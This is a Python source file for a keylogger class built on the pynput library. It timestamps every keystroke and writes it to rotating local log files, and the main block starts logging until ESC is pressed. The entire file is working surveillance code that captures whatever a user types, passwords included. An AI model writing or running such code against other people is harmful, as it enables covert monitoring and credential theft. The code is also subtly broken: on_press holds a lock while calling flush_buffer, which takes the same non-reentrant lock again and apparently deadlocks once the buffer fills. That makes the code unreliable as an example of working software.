from pynput import keyboard
import os
from datetime import datetime
import threading

#~~~~~~~KeyLogger Class~~~~~~~#
class KeyLogger:

#~~~~~~~Constructor~~~~~~~#
    def __init__(self, log_dir = "logs", file_prefix = "keylog", buffer_size=20,max_file_size=5*1024):
        self.log_dir = log_dir
        self.file_prefix = file_prefix
        self.buffer_size = buffer_size
        self.max_file_size = max_file_size
        os.makedirs(log_dir, exist_ok=True)
        self.log_index = 1
        self.buffer = []
        self.lock = threading.Lock()
        self.print_keys = True
        self.running = False
        self.listener = None

#~~~~~~~Define the social_map~~~~~~~#        
        self.social_map = {
            keyboard.Key.esc: "Escape",
            keyboard.Key.enter: "Enter",
            keyboard.Key.space: "Space",
            keyboard.Key.tab: "Tab",
            keyboard.Key.shift: "Shift",
            keyboard.Key.ctrl: "Control",
            keyboard.Key.alt: "Alt",
            keyboard.Key.cmd: "Command",
            keyboard.Key.caps_lock: "Caps Lock",
        }

#~~~~~~~Define the log file management methods~~~~~~~#
    def get_log_file(self):
        return os.path.join(self.log_dir, f"{self.file_prefix}_{self.log_index}.txt")
    
#~~~~~~~Define the log rotation method~~~~~~~#
    def rotate_log_file(self):
        log_file = self.get_log_file()
        if os.path.exists(log_file) and os.path.getsize(log_file) >= self.max_file_size:
            self.log_index += 1
            with open(self.get_log_file(), "a", encoding="utf-8") as f:
                f.write("~~~New Session~~~\n")

#~~~~~~~Define the key formatting method~~~~~~~#
    def format_key(self, key):
        if hasattr(key, 'char') and key.char is not None:
            return key.char
        elif key in self.social_map:
            return self.social_map[key]
        else:
            return f"[{key}]"
        
#~~~~~~~Define the buffer flushing method~~~~~~~#
    def flush_buffer(self):
        if not self.buffer:
            return
        with self.lock:
            log_file = self.get_log_file()
            data = self.buffer[:]
            self.buffer = []
        self.rotate_log_file()
        log_file = self.get_log_file()
        with open(log_file, "a", encoding="utf-8") as f:
                for entry in data:
                    f.write(entry + "\n")
           

#~~~~~~~Define the key press event handler~~~~~~~#
    def on_press(self, key):
        try:
            k = self.format_key(key)
            log_entry = f"{datetime.now()} - {k}"
            with self.lock:
                self.buffer.append(log_entry)
                if len(self.buffer) >= self.buffer_size:
                    self.flush_buffer()
        except Exception as e:
            with open("error.log", "a", encoding="utf-8") as err:
                err.write(f"{datetime.now()} - {str(e)}\n")

#~~~~~~~Define the key release event handler~~~~~~~#
    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False
        
#~~~~~~~Define the start method~~~~~~~#
    def start(self):
        self.running = True
        with open(self.get_log_file(), "a", encoding="utf-8") as f:
         f.write("~~~New logging Session~~~\n")
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        print("[*] Keylogger started...Press ESC to stop")

#~~~~~~~Define the stop method~~~~~~~#
    def stop(self):
        self.running = False
        self.flush_buffer()
        if self.listener:
            self.listener.stop()
            print("[*] Keylogger stopped.")

#~~~~~~~Define the main entry point~~~~~~~#
if __name__ == "__main__":
    keylogger = KeyLogger(buffer_size=10, max_file_size=1*1024)
    keylogger.start()
    keylogger.listener.join()
